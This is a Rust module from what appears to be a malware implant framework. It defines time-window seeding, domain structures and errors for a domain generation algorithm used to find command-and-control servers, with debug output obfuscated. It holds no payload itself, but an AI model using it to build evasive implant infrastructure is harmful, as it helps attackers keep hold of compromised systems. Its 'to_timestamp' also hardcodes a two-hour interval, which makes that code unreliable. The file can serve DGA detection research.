mod algorithm;
mod generator;

pub use algorithm::DgaAlgorithm;
pub use generator::DgaGenerator;

use std::time::{SystemTime, UNIX_EPOCH};

use chrono::TimeZone;
use chrono::{DateTime, Datelike, Timelike, Utc};
use malefic_gateway::ObfDebug;

/// DGA time window structure
#[derive(ObfDebug, Clone, PartialEq)]
pub struct TimeWindow {
    pub year: i32,
    pub month: u32,
    pub day: u32,
    pub hour_segment: u32,
}

impl TimeWindow {
    /// Create time window based on current time and interval hours
    pub fn from_timestamp(timestamp: u64, interval_hours: u32) -> Self {
        let dt = DateTime::from_timestamp(timestamp as i64, 0).unwrap_or_else(|| Utc::now());

        let hour_segment = dt.hour() / interval_hours;

        Self {
            year: dt.year(),
            month: dt.month(),
            day: dt.day(),
            hour_segment,
        }
    }

    /// Get current time window
    pub fn current(interval_hours: u32) -> Self {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        Self::from_timestamp(now, interval_hours)
    }

    /// Get previous time window
    pub fn previous(&self, interval_hours: u32) -> Self {
        let current_timestamp = self.to_timestamp();
        let previous_timestamp = current_timestamp.saturating_sub((interval_hours * 3600) as u64);
        Self::from_timestamp(previous_timestamp, interval_hours)
    }

    /// Convert to timestamp (for calculation)
    fn to_timestamp(&self) -> u64 {
        if let Some(dt) = Utc
            .with_ymd_and_hms(self.year, self.month, self.day, self.hour_segment * 2, 0, 0)
            .single()
        {
            dt.timestamp() as u64
        } else {
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs()
        }
    }

    /// Generate seed string for time window
    pub fn to_seed_string(&self) -> String {
        format!(
            "{:04}{:02}{:02}{:02}",
            self.year, self.month, self.day, self.hour_segment
        )
    }
}

/// DGA domain
#[derive(ObfDebug, Clone)]
pub struct DgaDomain {
    pub domain: String,
    pub seed: String,
    pub prefix: String,
    pub suffix: String,
}

/// DGA error type
#[derive(Debug, thiserror::Error)]
pub enum DgaError {
    #[error("DGA is disabled")]
    Disabled,
    #[error("No domains configured")]
    NoDomains,
    #[error("Invalid time window")]
    InvalidTimeWindow,
    #[error("Generation failed: {0}")]
    GenerationFailed(String),
}
